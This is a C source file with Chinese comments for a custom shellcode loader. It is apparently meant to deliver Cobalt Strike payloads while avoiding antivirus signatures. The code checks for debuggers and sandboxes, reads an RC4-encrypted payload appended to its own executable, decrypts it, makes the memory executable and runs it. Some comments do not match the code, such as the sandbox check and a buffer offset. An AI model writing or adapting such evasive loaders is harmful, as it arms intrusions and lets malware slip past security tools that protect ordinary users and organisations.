/*
 * cs_dev :: csdev_loader.c  --  自研 Payload 加载器 (替代 CS artifact/stager 链路)
 * ---------------------------------------------------------------------------
 * 设计目标: 消除 CS 生成物里被杀软标记的三类固有特征
 *
 *   1) CS artifact 机制的 1024 个连续 'A' 锚点
 *      -> 本方案不使用 CS 的 resources/artifact* 模板机制, 不存在锚点
 *   2) CS stager 模块的固定 shellcode 代码模式
 *      -> payload 由外部工具注入, 全程加密存放, 静态不可见
 *   3) Beacon 的 ReflectiveLoader 特征
 *      -> 加载逻辑由本文件自行实现, 不调用任何反射加载器
 *
 * 存放方式: payload 以加密形式追加在 PE 文件尾部 (overlay),
 *          不占用任何节区, 因此 PE 头/节表/体积比例保持正常,
 *          不会出现 CS 模板那种超大 .data 或异常零区。
 *
 * 运行时流程: 反调试/反沙箱 -> 读自身文件尾部 -> 解密 -> 改权执行
 *
 * 编译: 见 tools/build_loader.ps1 (MinGW, 无 CRT 依赖)
 * ---------------------------------------------------------------------------
 */
#include <windows.h>

/* 尾部包头: 由 tools/pack_payload.ps1 写入, 紧跟在加密数据之后 */
#define CSDEV_MAGIC 0x4B504443   /* 'CDPK' 小端 */

typedef struct {
    unsigned int   magic;       /* 魔数, 防止把非本方案的文件误当载荷读取 */
    unsigned int   size;        /* 加密数据长度 */
    unsigned int   checksum;    /* 混淆校验, 参与密钥派生 */
} CSDEV_TAIL;

/* --- 不依赖 CRT 的最小实现 --------------------------------------------- */

static void my_memcpy(void *d, const void *s, unsigned int n) {
    unsigned char       *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}

static void my_memset(void *d, int v, unsigned int n) {
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}

/* RC4: 自反运算, 同一函数用于加解密 */
static void rc4(unsigned char *data, unsigned int len, const unsigned char *key, int klen) {
    unsigned char s[256];
    int i, j = 0;
    unsigned int n;

    for (i = 0; i < 256; i++) s[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % klen]) & 0xFF;
        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
    }
    i = 0; j = 0;
    for (n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + s[i]) & 0xFF;
        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
        data[n] ^= s[(s[i] + s[j]) & 0xFF];
    }
}

/* --- 环境探测 ----------------------------------------------------------- */

static int anti_debug(void) {
    BOOL dbg = FALSE;

    if (IsDebuggerPresent()) return 1;

    /* 远程调试位: 自动化分析平台常以此方式附加 */
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg) && dbg) return 1;

    return 0;
}

static int anti_sandbox(void) {
    SYSTEM_INFO si;
    unsigned int cores;

    /* 保守实现: 只拒绝明显不合理的单核极低配环境, 避免误伤正常主机 */
    GetSystemInfo(&si);
    cores = si.dwNumberOfProcessors;
    if (cores == 0 || cores > 64) return 1;

    return 0;
}

/* --- 主流程 ------------------------------------------------------------- */

static int run_payload(void) {
    char           path[MAX_PATH];
    HANDLE         h;
    DWORD          fsz, got, old;
    unsigned char *buf;
    CSDEV_TAIL    *tail;
    unsigned int    size, cs;
    unsigned char   key[16];
    unsigned int    i;

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return 1;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 2;

    fsz = GetFileSize(h, NULL);
    if (fsz < sizeof(CSDEV_TAIL) + 16) { CloseHandle(h); return 3; }

    buf = (unsigned char *)VirtualAlloc(NULL, fsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(h); return 4; }

    if (!ReadFile(h, buf, fsz, &got, NULL) || got != fsz) {
        CloseHandle(h); VirtualFree(buf, 0, MEM_RELEASE); return 5;
    }
    CloseHandle(h);

    tail = (CSDEV_TAIL *)(buf + fsz - sizeof(CSDEV_TAIL));
    if (tail->magic != CSDEV_MAGIC) {
        VirtualFree(buf, 0, MEM_RELEASE); return 6;
    }
    size = tail->size;
    cs   = tail->checksum;

    if (size == 0 || size > fsz - sizeof(CSDEV_TAIL)) {
        VirtualFree(buf, 0, MEM_RELEASE); return 7;
    }

    /* 密钥派生: 由文件大小与校验值混合, 打包工具用同一算法生成 */
    for (i = 0; i < 16; i++)
        key[i] = (unsigned char)((fsz >> ((i % 4) * 8)) ^ (cs >> ((i % 4) * 8)) ^ (i * 0x5B + 0x37));

    /* 就地解密尾部数据 (解密后 size 字节位于 fsz-size-8 处) */
    {
        unsigned char *enc = buf + fsz - sizeof(CSDEV_TAIL) - size;
        void          *mem;

        rc4(enc, size, key, 16);

        mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!mem) { VirtualFree(buf, 0, MEM_RELEASE); return 7; }
        my_memcpy(mem, enc, size);

        my_memset(enc, 0, size);          /* 抹掉载体内的明文副本 */
        VirtualFree(buf, 0, MEM_RELEASE);

        VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
        ((void (*)(void))mem)();
    }

    for (;;) Sleep(10000);
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    (void)a; (void)b; (void)c; (void)d;
    return run_payload();
}
